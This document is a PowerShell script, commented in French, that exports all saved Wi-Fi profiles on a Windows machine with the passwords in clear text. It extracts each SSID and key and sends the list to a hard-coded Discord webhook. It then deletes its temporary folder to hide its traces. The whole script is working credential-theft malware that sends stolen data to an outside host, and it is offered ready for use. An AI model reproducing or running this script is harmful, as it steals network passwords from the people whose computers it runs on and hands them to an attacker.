# 1. Création et déplacement dans un dossier temporaire
$p = Join-Path $env:temp "wifi_data"
if (-Not (Test-Path $p)) { New-Item -ItemType Directory -Path $p }
Set-Location $p

# 2. Export des profils Wi-Fi en XML
netsh wlan export profile key=clear | Out-Null

# 3. Extraction des noms et mots de passe
$r = Get-ChildItem *.xml | ForEach-Object {
    $xml = [xml](Get-Content $_.FullName)
    [PSCustomObject]@{
        SSID     = $xml.WLANProfile.name
        Password = $xml.WLANProfile.MSM.Security.SharedKey.keyMaterial
    }
}

# 4. Préparation du message pour Discord
# On transforme la liste en texte, puis on l'insère dans un objet JSON
$msg = $r | Format-Table | Out-String
$payload = @{
    content = "```" + $msg + "```"
} | ConvertTo-Json

# 5. Envoi vers ton Webhook
$uri = 'https://discord.com/api/webhooks/1464042268062126192/bM0DHsu6iZpS2CtzN6GBEJ2PEMLNk1muv1Mohan6zQ90XRRwKuRdU8IPrIdv8cbVhUdR'

Invoke-RestMethod -Uri $uri -Method Post -Body $payload -ContentType 'application/json'

# 6. Nettoyage et sortie
Set-Location $env:temp
Remove-Item $p -Recurse -Force
exit
